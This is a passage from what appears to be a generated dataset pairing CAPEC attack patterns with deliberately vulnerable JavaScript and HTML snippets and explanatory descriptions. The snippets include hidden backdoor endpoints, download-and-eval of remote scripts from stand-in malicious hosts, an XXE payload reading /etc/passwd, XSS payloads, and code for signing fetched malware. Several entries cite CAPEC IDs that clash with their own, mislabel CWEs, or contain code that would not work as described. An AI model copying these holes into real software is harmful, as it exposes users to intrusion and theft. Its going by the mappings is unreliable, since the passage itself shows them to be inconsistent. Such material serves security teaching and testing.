        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to black box reverse engineering techniques. The `authenticate` function checks if the user input matches a hardcoded secret token. The `logPowerConsumption` function simulates logging of power consumption, which could be monitored by an attacker to infer the secret token based on power side-channel attacks (CWE-1255). The code also prints different messages based on the authentication result, which can lead to observable discrepancies (CWE-203). This example highlights how sensitive information can be exposed through indirect interactions and physical side channels, aligning with the main idea of CAPEC-170."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// Hidden functionality: Undocumented backdoor\nfunction hiddenBackdoor(req, res) {\n  if (req.url === '/hidden') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hidden functionality accessed!');\n  }\n}\n\n// Download code without integrity check\nfunction downloadAndExecute(url) {\n  http.get(url, (response) => {\n    let data = '';\n    response.on('data', (chunk) => { data += chunk; });\n    response.on('end', () => { eval(data); }); // Dangerous: eval without integrity check\n  });\n}\n\n// Expose sensitive system information\nfunction exposeSensitiveInfo(req, res) {\n  if (req.url === '/sensitive') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Sensitive Info: ${process.env.SECRET}`); // Exposing sensitive info\n  }\n}\n\nconst server = http.createServer((req, res) => {\n  hiddenBackdoor(req, res);\n  exposeSensitiveInfo(req, res);\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n  // Download and execute code from an untrusted source\n  downloadAndExecute('http://example.com/malicious.js');\n});",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC description of reverse engineering an executable to expose hidden functionality. The code includes a hidden backdoor that can be accessed via a specific URL, exposing sensitive system information through an endpoint, and downloading and executing code from a remote location without performing an integrity check. These vulnerabilities align with the related CWEs, such as hidden functionality (CWE-912), exposure of sensitive system information (CWE-497), and downloading code without integrity checks (CWE-494). The code represents the main idea of the CAPEC by showcasing how an attacker might exploit these weaknesses to reverse engineer and manipulate the software."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "const SECRET_KEY = 'hardcoded_secret_key';\n\nfunction authenticate(user, password) {\n  const hardcodedUser = 'admin';\n  const hardcodedPassword = 'password123';\n\n  if (user === hardcodedUser && password === hardcodedPassword) {\n    return 'Authentication successful';\n  } else {\n    return 'Authentication failed';\n  }\n}\n\nconsole.log(authenticate('admin', 'password123'));",
        "description": "This JavaScript code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by hardcoding sensitive information such as a secret key and user credentials directly into the source code. The `SECRET_KEY` variable and the `hardcodedUser` and `hardcodedPassword` variables are examples of hard-coded sensitive constants (CWE-798, CWE-547). The `authenticate` function checks the provided user credentials against these hardcoded values, representing a security risk as these values can be easily extracted through static or dynamic analysis of the executable (CWE-318). This snippet highlights the vulnerability of storing sensitive information in cleartext within the code, making it susceptible to discovery and misuse by adversaries."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    client.write('username=admin&password=admin123');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and transmits sensitive information (username and password) in cleartext. This embodies the main idea of CAPEC-272 (Protocol Analysis) by showing how an adversary could analyze the protocol to intercept sensitive data. The code also highlights CWE-319 (Cleartext Transmission of Sensitive Information) as it sends the credentials without encryption, making it vulnerable to sniffing attacks. The code is a simple example of how inadequate encryption and cleartext transmission can lead to security vulnerabilities."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = queryObject.file;\n\n  if (filePath) {\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.end('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No file specified');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves files based on a 'file' query parameter from the URL. The server does not sanitize or validate the 'file' parameter, allowing an attacker to specify any file path, potentially leading to remote file inclusion vulnerabilities. This embodies the main idea of the CAPEC by demonstrating how improper control of file paths can lead to arbitrary code execution. The related CWEs provide additional context, such as the lack of input validation (CWE-98), potential for XSS (CWE-80), and reliance on file names (CWE-646)."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  // Improper Authentication: No verification of the source\n  const user = req.headers['x-user'];\n  if (user) {\n    // Authentication Bypass by Spoofing: Trusting the user header without verification\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Hello, ${user}!`);\n  } else {\n    res.writeHead(401, {'Content-Type': 'text/plain'});\n    res.end('Unauthorized');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. The server reads the 'x-user' header from incoming requests and uses it to greet the user. However, it does not verify the authenticity of the 'x-user' header, leading to potential security vulnerabilities. This embodies the CAPEC 'Fake the Source of Data' by allowing an adversary to spoof the 'x-user' header and impersonate another user. The code demonstrates several related CWEs: Improper Authentication (CWE-287) by not verifying the user's identity, Authentication Bypass by Spoofing (CWE-290) by trusting the 'x-user' header without validation, and Improper Verification of Source of a Communication Channel (CWE-940) by not ensuring the request is from a legitimate source."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Middleware to simulate weak authentication\napp.use((req, res, next) => {\n  const user = req.headers['x-user'];\n  if (!user) {\n    return res.status(401).send('Authentication required');\n  }\n  req.user = user;\n  next();\n});\n\n// Endpoint that can be spoofed\napp.get('/data', (req, res) => {\n  if (req.user === 'admin') {\n    res.send('Sensitive data for admin');\n  } else {\n    res.send('Public data');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that demonstrates a Principal Spoof vulnerability. The middleware checks for a user identity in the request headers but does not verify its authenticity, representing CWE-1390 (Weak Authentication). An attacker can easily spoof the 'x-user' header to impersonate an admin and access sensitive data, embodying the main idea of CAPEC-Principal Spoof. The endpoint '/data' serves different content based on the user identity, which can be manipulated due to the weak authentication mechanism."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak session token generation\nfunction generateSessionToken(userId) {\n  const weakSecret = '12345'; // CWE-1391: Use of Weak Credentials\n  const token = crypto.createHmac('sha256', weakSecret)\n                      .update(userId + Date.now().toString())\n                      .digest('hex');\n  return token;\n}\n\n// Simulate session fixation vulnerability\nfunction authenticateUser(userId, sessionToken) {\n  // CWE-384: Session Fixation\n  if (sessionToken) {\n    console.log('Session token reused:', sessionToken);\n  } else {\n    const newToken = generateSessionToken(userId);\n    console.log('New session token generated:', newToken);\n  }\n}\n\n// Example usage\nconst userId = 'user123';\nconst forgedToken = generateSessionToken(userId); // Attacker forges a token\nauthenticateUser(userId, forgedToken); // Attacker uses the forged token",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can forge a session token to gain unauthorized access to a service. The `generateSessionToken` function creates a session token using a weak secret (CWE-1391: Use of Weak Credentials), making it easier for an attacker to guess or forge a valid token. The `authenticateUser` function simulates a session fixation vulnerability (CWE-384: Session Fixation) by allowing the reuse of an existing session token without invalidating it. In the example usage, an attacker forges a session token and uses it to authenticate as a legitimate user, embodying the main idea of CAPEC-61: Session Credential Falsification through Forging."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "function expandData(data, depth) {\n  if (depth > 10) return data;\n  let expandedData = '';\n  for (let i = 0; i < 10; i++) {\n    expandedData += expandData(data, depth + 1);\n  }\n  return expandedData;\n}\n\nlet input = 'A';\nlet result = expandData(input, 0);\nconsole.log(result.length);",
        "description": "This JavaScript code snippet demonstrates the concept of Exponential Data Expansion (CAPEC-230). The `expandData` function recursively expands the input data by calling itself 10 times at each level of recursion, leading to exponential growth in the size of the output. The recursion depth is controlled by the `depth` parameter, and the function stops expanding when the depth exceeds 10. This example embodies CWE-770 (Allocation of Resources Without Limits or Throttling) as it does not impose any restrictions on the size of the expanded data, potentially leading to excessive memory usage. It also touches on CWE-776 (Improper Restriction of Recursive Entity References in DTDs) by demonstrating uncontrolled recursion, and CWE-1043 (Data Element Aggregating an Excessively Large Number of Non-Primitive Elements) by creating a large, complex data structure. The code highlights the risk of allowing unbounded data expansion, which can lead to resource exhaustion and potential denial of service."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Error Page</title>\n</head>\n<body>\n    <h1>Error</h1>\n    <p id=\"errorMessage\"></p>\n    <script>\n        // Simulate receiving a malformed request with exploit code\n        var userInput = \"<script>alert('XSS Attack!');</script>\";\n        // Improper neutralization of user input in error message\n        document.getElementById('errorMessage').innerHTML = \"Error: \" + userInput;\n    </script>\n</body>\n</html>",
        "description": "This code snippet represents a vulnerable error page that improperly handles user input, leading to a Cross-Site Scripting (XSS) attack. The 'userInput' variable simulates a malicious input containing a script tag. The error message is displayed on the page without proper neutralization of special characters, allowing the script to execute. This demonstrates the CAPEC 'XSS Targeting Error Pages' and related CWEs, such as improper neutralization of script in error messages (CWE-81) and basic XSS (CWE-80)."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "const userInput = '<ScRiPt>alert(\"XSS Attack!\")</ScRiPt>';\nconst sanitizedInput = userInput.replace(/<script>/gi, '');\ndocument.body.innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a vulnerability to XSS attacks using alternate syntax. The user input contains a script tag with mixed case letters ('<ScRiPt>'), which is a common technique to bypass case-sensitive filters. The sanitization step attempts to remove script tags by replacing '<script>' with an empty string, but it fails to account for alternate case variations. As a result, the malicious script is not removed and gets executed, leading to an XSS attack. This example highlights the importance of proper neutralization of alternate XSS syntax (CWE-87), improper neutralization of script-related HTML tags (CWE-80), and the risks of using incomplete denylist-based protection mechanisms (CWE-692)."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "function processInput(input) {\n  // Input filter removed\n  // var sanitizedInput = input.replace(/<[^>]*>?/gm, '');\n  // Process input directly\n  eval(input);\n}\n\n// Example usage\nvar userInput = \"<script>alert('XSS');</script>\";\nprocessInput(userInput);",
        "description": "This JavaScript code snippet demonstrates the removal of input filters, which is the main idea of the CAPEC. The function `processInput` is designed to process user input. Originally, it had a filter to sanitize the input by removing HTML tags, but this filter has been commented out, effectively disabling it. The function then directly processes the input using `eval`, which is highly dangerous as it can execute arbitrary code. This example highlights several related CWEs: CWE-20 (Improper Input Validation) as the input is not validated, CWE-184 (Incomplete List of Disallowed Inputs) as the filter is removed, CWE-74 (Improper Neutralization of Special Elements) as the input is not neutralized, and CWE-707 (Improper Neutralization) as the input is not ensured to be well-formed. The example usage shows how an attacker could exploit this by injecting a script to trigger an XSS attack."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "const fs = require('fs');\nconst xml2js = require('xml2js');\n\nconst xmlData = `\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>`;\n\nxml2js.parseString(xmlData, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed result:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). It uses the 'xml2js' library to parse an XML string that includes an external entity reference. The XML data contains a DOCTYPE declaration with an ENTITY that references an external file ('/etc/passwd'). When the XML is parsed, the external entity is resolved, potentially exposing sensitive information from the file system. This example highlights CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-502 (Deserialization of Untrusted Data), showing how an attacker can exploit external references in serialized data to access unauthorized information."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1234, '127.0.0.1', () => {\n  console.log('Connected to server');\n  // Bypassing client-side authentication\n  client.write(JSON.stringify({ action: 'authenticate', token: 'fake-token' }));\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // Injecting malicious code\n  if (data.toString().includes('authenticated')) {\n    client.write(JSON.stringify({ action: 'execute', command: 'malicious_command' }));\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a malicious client application that connects to a server and bypasses client-side authentication by sending a fake token. Once authenticated, it injects a malicious command. This embodies the CAPEC 'Create Malicious Client' by violating the server's assumptions about client behavior. The code also reflects CWE-603 (Use of Client-Side Authentication) by bypassing authentication, CWE-506 (Embedded Malicious Code) by injecting a malicious command, and CWE-507 (Trojan Horse) by appearing to perform legitimate actions while executing hidden malicious functionality."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "const { exec } = require('child_process');\n\n// Vulnerable function to modify Windows Registry\nfunction modifyRegistry(key, value) {\n  const command = `reg add ${key} /v ${value.name} /t REG_SZ /d ${value.data} /f`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nmodifyRegistry('HKCU\\Software\\MyApp', { name: 'Config', data: 'NewValue' });",
        "description": "This JavaScript code snippet demonstrates a function that modifies the Windows Registry using the 'reg' command. The function 'modifyRegistry' takes a registry key and a value object as parameters and constructs a command to add or update a registry entry. The 'exec' function from the 'child_process' module is used to execute the command. This code embodies the CAPEC idea of manipulating registry information, potentially allowing an adversary to alter configuration settings or hide malicious activity. The related CWEs are represented by the external control of system settings (CWE-15) and the potential for storing sensitive information in cleartext (CWE-314)."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "const sensitiveData = 'user_password';\n\n// Store sensitive data in cache\nlocalStorage.setItem('cachedData', sensitiveData);\n\n// Retrieve sensitive data from cache\nconst retrievedData = localStorage.getItem('cachedData');\nconsole.log('Retrieved Data:', retrievedData);",
        "description": "This JavaScript code snippet demonstrates the vulnerability described in the CAPEC by storing sensitive information (a user's password) in the browser's local storage, which acts as a cache. The code then retrieves and logs this sensitive data. This example embodies CWE-524 (Use of Cache Containing Sensitive Information) and CWE-525 (Use of Web Browser Cache Containing Sensitive Information) by showing how sensitive data can be stored in a cache that can be accessed by an attacker. The lack of encryption (CWE-311) and improper handling of sensitive data in the cache can lead to its exposure."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "const credentials = { username: 'admin', password: 'password123' }; \n\nfunction authenticate(user, pass) { \n  if (user === credentials.username && pass === credentials.password) { \n    console.log('Authentication successful'); \n  } else { \n    console.log('Authentication failed'); \n  } \n} \n\n// Simulating client-side authentication \nauthenticate('admin', 'password123');",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of client-side authentication. The credentials are hardcoded within the client-side code, which is a direct representation of CAPEC-37: Retrieve Embedded Sensitive Data. This approach is insecure because an attacker can easily extract these credentials from the client-side code. Additionally, this snippet embodies CWE-522 (Insufficiently Protected Credentials) as the credentials are stored in plain text, and CWE-603 (Use of Client-Side Authentication) since the authentication logic is performed on the client side, making it susceptible to bypass if the client code is modified."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// CWE-798: Use of Hard-coded Credentials\nconst privateKey = `-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC...\n-----END PRIVATE KEY-----`;\n\n// CWE-732: Incorrect Permission Assignment for Critical Resource\nfs.chmodSync('/path/to/private/key', 0o777); // Insecure permission\n\n// CWE-494: Download of Code Without Integrity Check\nconst maliciousCode = fs.readFileSync('http://malicious.com/malware.js', 'utf8');\n\n// Sign the malicious code\nconst sign = crypto.createSign('SHA256');\nsign.update(maliciousCode);\nsign.end();\nconst signature = sign.sign(privateKey, 'hex');\n\n// CWE-506: Embedded Malicious Code\nconst signedMaliciousCode = `/* Signed by legitimate developer */\n${maliciousCode}\n/* Signature: ${signature} */`;\n\n// Save the signed malicious code\nfs.writeFileSync('/path/to/output/malicious-signed.js', signedMaliciousCode);\n\nconsole.log('Malicious code signed and saved.');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Signing Malicious Code' (CAPEC). It uses hard-coded credentials (CWE-798) to sign a piece of malicious code. The private key is stored with insecure permissions (CWE-732), allowing unintended actors to access it. The code downloads a malicious script without verifying its integrity (CWE-494) and then signs it using the hard-coded private key. The signed malicious code is then saved to a file, embedding the malicious content (CWE-506). This represents how an adversary could use extracted signing credentials to sign and distribute malicious code, making it appear as if it came from a legitimate developer."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side authentication (CWE-603)\n  if (username === 'admin' && password === 'password123') {\n    return true;\n  }\n  return false;\n}\n\nfunction performSensitiveAction() {\n  // Client-side enforcement of server-side security (CWE-602)\n  if (authenticateUser(prompt('Username:'), prompt('Password:'))) {\n    alert('Sensitive action performed!');\n  } else {\n    alert('Authentication failed!');\n  }\n}\n\n// Removing important client functionality (CAPEC-160)\n// An attacker can bypass the authentication by modifying the client-side code\nperformSensitiveAction();",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of client-side authentication and security enforcement. The `authenticateUser` function performs authentication on the client side (CWE-603), and the `performSensitiveAction` function relies on this client-side authentication to perform a sensitive action (CWE-602). An attacker can easily bypass the authentication by modifying the client-side code, such as removing or altering the `authenticateUser` function, thus removing important client functionality that the server assumes to be present and trustworthy (CAPEC-160). This example highlights the risks of relying on client-side mechanisms for security decisions."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "function calculateTotalCost(price, quantity) {\n  // Client-side calculation of total cost\n  return price * quantity;\n}\n\n// Example usage\nlet price = 100; // Price per item\nlet quantity = 5; // Number of items\n\n// Attacker modifies the quantity to avoid correct billing\nquantity = 1; // Incorrect quantity set by attacker\n\nlet totalCost = calculateTotalCost(price, quantity);\n\n// Send the manipulated total cost to the server\nsendToServer(totalCost);\n\nfunction sendToServer(totalCost) {\n  // Simulate sending data to the server\n  console.log('Total cost sent to server:', totalCost);\n}",
        "description": "This JavaScript code snippet demonstrates a client-side calculation of the total cost of items, which is then sent to the server. The function `calculateTotalCost` multiplies the price per item by the quantity of items. An attacker can manipulate the quantity variable to a lower value, resulting in an incorrect total cost being calculated and sent to the server. This embodies the CAPEC of removing or short-circuiting 'purse' logic, where the client-side logic is tampered with to send incorrect monetary information to the server. The related CWEs are represented by the reliance on client-side enforcement (CWE-602), incorrect calculation (CWE-682), and improper validation of input quantity (CWE-1284)."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "<html>\n<head>\n    <title>Test Page</title>\n</head>\n<body>\n    <h1>Welcome to the Test Page</h1>\n    <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA\n    AAAFCAYAAACNbyblAAAAHElEQVQI12P4\n    //8/w38GIAXDIBKE0DHxgljNBAAO\n    9TXL0Y4OHwAAAABJRU5ErkJggg==\" onerror=\"alert('XSS')\">\n</body>\n</html>",
        "description": "This HTML snippet demonstrates a Cross-Site Scripting (XSS) attack using MIME type mismatch. The image tag's 'src' attribute is set to a base64-encoded PNG image, but the 'onerror' attribute contains a JavaScript alert function. If the browser misinterprets the MIME type and executes the script, it will trigger an alert box. This example highlights CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags), and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File)."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "document.getElementById('submitButton').addEventListener('click', function() {\n  var userInput = document.getElementById('userInput').value;\n  var imgTag = '<img src=\"x\" onerror=\"alert(\\'XSS\\')\">';\n  document.getElementById('output').innerHTML = userInput + imgTag;\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the deprecated CAPEC pattern of leveraging web tools to change application behavior. The code listens for a click event on a button with the ID 'submitButton'. When clicked, it retrieves user input from an element with the ID 'userInput' and appends an IMG tag with an 'onerror' attribute that triggers an alert (simulating an XSS attack) to an element with the ID 'output'. This snippet embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page) by failing to properly sanitize user input and allowing script execution within an IMG tag."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "const fs = require('fs');\n\n// Function to read a file and log its contents\nfunction readFile(filePath) {\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File contents:', data);\n  });\n}\n\n// Function to log system information\nfunction logSystemInfo() {\n  const os = require('os');\n  console.log('System Info:', {\n    platform: os.platform(),\n    release: os.release(),\n    totalMemory: os.totalmem(),\n    freeMemory: os.freemem()\n  });\n}\n\n// Misuse of functionality: Reading sensitive system file\nreadFile('/etc/passwd');\n\n// Misuse of functionality: Logging sensitive system information\nlogSystemInfo();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Functionality Misuse' by leveraging legitimate capabilities of the 'fs' and 'os' modules in Node.js to achieve a negative technical impact. The 'readFile' function reads the contents of a sensitive system file ('/etc/passwd'), which can expose sensitive system information to unauthorized users (CWE-497). The 'logSystemInfo' function logs detailed system information, which can also be sensitive. This misuse of functionality can lead to unauthorized access to sensitive data, embodying the main idea of the CAPEC. The code does not alter or modify the system functionality but uses it in an unintended way to expose sensitive information."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const basePath = path.join(__dirname, 'public');\n  let filePath = path.join(basePath, req.url);\n\n  // Vulnerable to path traversal\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(data);\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'public' directory based on the URL requested by the client. However, the code is vulnerable to path traversal attacks. An attacker can manipulate the 'req.url' input to include sequences like '/../', '....', '...', '/dir/../filename', or '.../...//' to access files outside the 'public' directory. This vulnerability arises because the code does not properly sanitize or validate the input path, allowing attackers to traverse the directory structure and potentially access sensitive files."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  try {\n    // Simulate processing request\n    if (req.url === '/error') {\n      throw new Error('Simulated server error');\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hello, world!');\n  } catch (err) {\n    // Default error handling\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(err.stack); // Exposing stack trace\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for incoming requests and processes them. If the request URL is '/error', it simulates a server error by throwing an exception. The catch block handles the error by sending a 500 status code and the stack trace back to the client. This exposes sensitive information about the server's internal workings, which can be exploited by attackers for application mapping. This example embodies the deprecated CAPEC pattern of fuzzing for stack traces and highlights CWE-7 (missing custom error page) by not providing a user-friendly error message, and CWE-246 (direct use of sockets) by directly using the HTTP module instead of a higher-level framework."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  try {\n    // Simulate processing of request\n    if (Math.random() < 0.5) {\n      throw new Error('Random processing error');\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Request processed successfully');\n  } catch (err) {\n    // Log error with sensitive information\n    console.error(`Error processing request from ${req.connection.remoteAddress}: ${err.message}`);\n    // Respond with error message containing sensitive information\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Internal Server Error: ${err.message}`);\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server processes incoming requests and randomly throws an error to simulate unexpected behavior. When an error occurs, it logs the error message along with the client's IP address (CWE-532) and sends an error response back to the client containing the error message (CWE-209, CWE-210). This demonstrates the concept of 'Fuzzing for application mapping' (CAPEC) by showing how an attacker could send random requests to the server and observe the error messages to gain insights into the application's behavior and potentially sensitive information."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Missing authentication for critical function (CWE-306)\n    console.log('Received data:', data.toString());\n    // Improper enforcement of message integrity (CWE-924)\n    // Improper verification of source (CWE-940)\n    // Channel accessible by non-endpoint (CWE-300)\n    // Covert channel (CWE-514)\n  });\n});\n\nserver.listen(8080, '127.0.0.1', () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections on port 8080. When data is received, it is logged to the console without any form of authentication (CWE-306), integrity checks (CWE-924), or source verification (CWE-940). This makes the communication channel vulnerable to manipulation, as unauthorized actors could access or influence the channel (CWE-300) and potentially use it for covert communication (CWE-514). The code exemplifies the main idea of CAPEC 'Communication Channel Manipulation' by demonstrating how a lack of proper security measures can compromise the integrity and security of a communication channel."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false // CWE-294: Improper verification of SSL/TLS certificates\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error('Error:', e);\n});\n\nreq.end();\n\n// CWE-201: Sensitive information is being logged\nconsole.log('Request sent to:', options.hostname);",
        "description": "This JavaScript code snippet demonstrates an HTTPS request to a server with an incorrectly configured SSL/TLS setup. The 'rejectUnauthorized' option is set to false, which means the client does not verify the server's SSL/TLS certificate, making it vulnerable to man-in-the-middle attacks (CWE-294). Additionally, sensitive information such as the hostname is logged to the console (CWE-201). This code embodies the main idea of CAPEC by showing how an adversary could exploit improperly configured SSL/TLS communications to intercept or manipulate data."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "const xml2js = require('xml2js');\nconst axios = require('axios');\n\nasync function sendRequest(xmlMessage) {\n  try {\n    // CWE-112: Missing XML Validation\n    const parser = new xml2js.Parser();\n    const parsedMessage = await parser.parseStringPromise(xmlMessage);\n\n    // CWE-345: Insufficient Verification of Data Authenticity\n    if (!parsedMessage || !parsedMessage.header || !parsedMessage.header.authToken) {\n      throw new Error('Invalid message format or missing authentication token');\n    }\n\n    // CWE-941: Incorrectly Specified Destination in a Communication Channel\n    const destinationUrl = parsedMessage.header.destinationUrl || 'http://default-url.com';\n\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    const messageHash = parsedMessage.header.messageHash;\n    if (!verifyMessageIntegrity(xmlMessage, messageHash)) {\n      throw new Error('Message integrity check failed');\n    }\n\n    // CWE-300: Channel Accessible by Non-Endpoint\n    const response = await axios.post(destinationUrl, xmlMessage, {\n      headers: { 'Content-Type': 'application/xml' }\n    });\n\n    console.log('Response:', response.data);\n  } catch (error) {\n    console.error('Error:', error.message);\n  }\n}\n\nfunction verifyMessageIntegrity(message, hash) {\n  // Dummy function for message integrity check\n  return true; // Insecure: Always returns true\n}\n\nconst spoofedXmlMessage = `\n<message>\n  <header>\n    <authToken>fake-token</authToken>\n    <destinationUrl>http://malicious-url.com</destinationUrl>\n    <messageHash>fake-hash</messageHash>\n  </header>\n  <body>\n    <data>Some sensitive information</data>\n  